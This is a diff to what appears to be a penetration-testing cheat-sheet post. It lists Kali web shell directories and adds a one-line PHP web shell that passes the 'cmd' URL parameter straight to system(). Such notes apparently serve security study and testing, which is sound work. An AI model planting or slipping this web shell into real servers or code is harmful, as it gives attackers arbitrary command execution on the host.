@@ -11,6 +11,9 @@ layout: post
 Kali ready-to-go webshells
 /usr/share/webshells/
 /usr/share/seclists/Web-Shells/
+
+PHP code for a simple web shell:
+<?php $cmd=$_GET['cmd']; system($cmd);?>
 ```
 
 ###### List payload options
